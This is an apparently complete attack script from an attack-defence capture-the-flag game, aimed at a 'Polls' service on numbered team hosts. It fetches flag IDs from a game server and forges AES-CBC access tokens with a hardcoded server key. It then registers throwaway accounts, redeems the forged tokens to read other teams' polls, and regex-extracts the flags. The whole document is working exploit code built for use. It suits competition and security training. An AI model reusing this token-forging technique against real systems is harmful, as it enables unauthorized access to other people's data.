from pwn import *
import requests
import sys
import string
import json
from Crypto.Cipher import AES
import random
import re

team_id = sys.argv[1]
target = f"10.60.{team_id}.1"
port = 5000
service_name = "Polls"
server_key = b"16_r4ndom_bytes!"


def get_random_string(n, alph=string.ascii_letters+string.digits):
    return ''.join([random.choice(alph) for _ in range(n)])


def get_flag_id(target, service_name):
    return requests.get("http://10.10.0.1:8081/flagIds").json()[service_name][target]


def attack(target, service_name):
    flag_ids = get_flag_id(target, service_name)
    ret = b""

    for flag_id in flag_ids:
        user = get_random_string(random.randint(10, 16))
        password = get_random_string(random.randint(10, 16))
        poll_id = json.loads(flag_id)["poll_id"]
        cipher = AES.new(server_key, AES.MODE_CBC)
        token = cipher.encrypt(poll_id.encode())
        token = cipher.iv + token
        r = remote(target, port)
        r.recvuntil(b": ")
        r.sendline(b"register")
        r.recvuntil(b": ")
        r.sendline(user.encode())
        r.recvuntil(b": ")
        r.sendline(password.encode())
        r.recvuntil(b": ")
        r.sendline(b"use token")
        resp = r.recvuntil(b": ")
        r.sendline(token.hex().encode())
        assert b"OK" in r.recvline()
        r.recvuntil(b": ")
        r.sendline(b"access poll")
        resp = r.recvuntil(b": ")
        r.sendline(b"show")
        r.recvuntil(b": ")
        r.sendline(poll_id.encode())
        resp = r.recvuntil(b": ")
        ret += resp
        r.close()
    return re.findall(b"[A-Z0-9]{31}=", ret.replace(b" ", b"").replace(b"\n", b""))


print(attack(target, service_name))
